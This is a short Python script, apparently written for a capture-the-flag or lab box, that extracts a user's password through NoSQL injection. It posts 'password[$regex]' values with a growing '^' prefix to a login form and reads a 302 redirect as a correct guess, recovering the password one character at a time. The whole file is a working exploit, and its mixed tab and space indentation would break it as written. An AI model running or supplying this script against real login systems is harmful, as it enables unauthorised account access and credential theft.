import requests
import string


#Reminder to check length of password!

flag = ""
url = ""

char = string.printable
restart = True
meta2 = "*+.?|"

for i in meta2:
	char = char.replace(i,'')


while restart:
    restart = False

    for i in char:

        payload = flag + i

	post_data = {'username': 'mango', 'password[$regex]':"^"+ payload,'login':'login'}
        r = requests.post(url, data=post_data, allow_redirects=False)

        # A correct password means we get a 302 redirect

        if r.status_code == 302:
            print(payload)
            restart = True
            flag = payload

            if len(payload) == 16: #EDIT LENGTH OF PASSWORD HERE
                print("\nFlag: " + flag)

                exit(0)
            break
